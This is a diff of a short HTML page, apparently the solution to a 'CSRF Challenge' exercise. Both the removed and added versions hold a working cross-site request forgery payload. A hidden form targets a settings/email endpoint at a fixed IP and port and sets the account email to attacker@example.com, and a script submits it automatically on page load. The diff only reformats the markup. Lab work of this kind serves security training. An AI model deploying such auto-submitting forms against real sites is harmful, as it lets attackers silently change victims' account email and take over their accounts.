@@ -1,17 +1,12 @@
+
 <!DOCTYPE html>
 <html>
-<head>
-    <title>CSRF Challenge</title>
-</head>
 <body>
-
-    <form action="http://100.101.228.35:6009/settings/email" method="GET">
-        <input type="hidden" name="new" value="attacker@example.com">
-    </form>
-
-    <script>
-        document.forms[0].submit();
-    </script>
-
+<form action="http://100.101.228.35:6009/settings/email" method="GET">
+<input type="hidden" name="new" value="attacker@example.com">
+</form>
+<script>
+document.forms[0].submit();
+</script>
 </body>
 </html>
